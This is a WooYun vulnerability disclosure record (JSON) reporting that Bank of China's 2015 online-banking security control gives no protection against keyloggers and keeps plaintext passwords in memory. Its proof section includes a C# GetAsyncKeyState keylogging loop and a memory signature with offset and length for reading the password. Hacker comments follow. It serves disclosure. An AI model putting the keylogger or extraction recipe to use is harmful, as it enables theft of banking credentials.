{"id": 5312, "wybug_id": "wooyun-2015-0114746", "wybug_title": "纸糊的国内网银安全控件系列漏洞之中国银行篇（一）", "wybug_corp": "中国银行", "wybug_author": "路人甲", "wybug_date": "2015-05-18 11:18", "wybug_open_date": "2015-08-16 14:44", "wybug_type": "用户敏感数据泄漏", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计错误", "设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-16：\t细节向公众公开  简要描述： 按说网银安全控件应该是能够在不安全的环境里保护用户安全的（废话！本来就安全的环境还要他保护个蛋啊！）。但实际上由于设计缺陷，某些控件一点安全性都没有。 详细说明：  中国银行个人网银安全控件完全不能保护用户密码，完全没有对抗键盘记录的设计。更严重的是！内存里有明文密码，而且位置不随机，直接搜索内存特征码即可查找到！详细内容见证明。   漏洞证明：  完全没有键盘记录器的对抗，甚至无需键盘钩子，循环调用API函数GetAsyncKeyState即可进行键盘记录。\nbool bShift = false;            for (int key = 0; key < 120; key++)            {                if (GetAsyncKeyState(key) != 0)                {                    if (key == 8)                    {                        textBox1.Text = textBox1.Text + \"BS,\";                        continue;                    }                    if (key == 16)                    {                        bShift = true;                        continue;                    }                    if (key < 20 || key > 90)                        continue;                    if (bShift)                    {                        textBox1.Text = textBox1.Text + \"S+\" + ((char)key).ToString() + \",\";                    }                    else                    {                        textBox1.Text = textBox1.Text + ((char)key).ToString() + \",\";                    }                }            }\n内存搜索特征码：01 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00找到后偏移地址+0x20，读取内存长度0x14，进行ascii转换后即为明文密码。图中左上为内存搜索结果，左下为调用GetAsyncKeyState进行键盘记录的demo，右侧为安装了中行安全控件的IE。\n\n   修复方案：  咱好好设计下行不？这安全性除了能防XSS直接JS读密码以外啥都防不了。虽然其他银行也不咋地吧，人家好歹内存没有明文，做个键盘消息拦截防一下键盘记录器，虽然也没什么用。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-05-18 14:42 厂商回复： 谢谢，我们将对漏洞尽快处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-18 11:19 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  网银控件应该是保障用户计算机安全不可控前提下的产物吧？目的也是为了能够在不安全的情况下保证用户财产安全。    \n     2015-05-18 11:19 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  系列？    \n     2015-05-18 11:46 |    \t\tHerolon \t\t\t( 普通白帽子  |\t\t\t        Rank:185 漏洞数:42        | ******)\t\t \n  中国网银系列漏洞连续剧  如有雷同 纯属巧合    \n     2015-05-18 11:51 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:11        | 我是一颗小小树)\t\t \n  四大银行能聚齐吗    \n     2015-05-18 12:30 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:16        | 猜猜我是谁？)\t\t \n  前排出售瓜子饮料小马扎    \n     2015-05-18 13:09 |    \t\t找寻者 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 学习啊)\t\t \n  在现在这个大数据的时代，不关注安全的，除了某些之外，前途？    \n     2015-05-18 13:20 |    \t\tB1acken \t\t\t( 普通白帽子  |\t\t\t        Rank:174 漏洞数:56        | 渣渣)\t\t \n  7楼，默默关注    \n     2015-05-18 14:21 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:16        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  8楼，默默关注    \n     2015-05-18 17:13 |    \t\t小指头 \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:19        | 不想当大拇指的小指头，不是个好手。)\t\t \n  mark    \n     2015-05-18 17:24 |    \t\t孔卡 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:12        | 我已经过了那个餐桌上只有一条鸡腿就一定能...)\t\t \n  啥时候公开 看个洞有这难么    \n     2015-05-19 17:26 |    \t\tD_in \t\t\t( 普通白帽子  |\t\t\t        Rank:413 漏洞数:62        | 到我嘴里来)\t\t \n  默默关注    \n     2015-05-21 15:22 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  纸糊＝＝    \n     2015-05-21 17:09 |    \t\t真旅网集团(乌云厂商)\t\t \n  期待银行资金安全的漏洞浮现（：    \n     2015-05-22 08:55 |    \t\tmr.yu \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:12        )\t\t \n  跟绿盟发布的一样？    \n     2015-05-23 11:11 |    \t\tLet a person cry. \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:9        | xxoo)\t\t \n  后面看到（一）..就会有23456789..一般剧情都是这样的    \n     2015-08-16 18:26 |    \t\tk0_pwn \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 专注二进制许多年，突然觉得web才好玩)\t\t \n  前提是利用这个漏洞开发专用的木马然后让用户感染？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}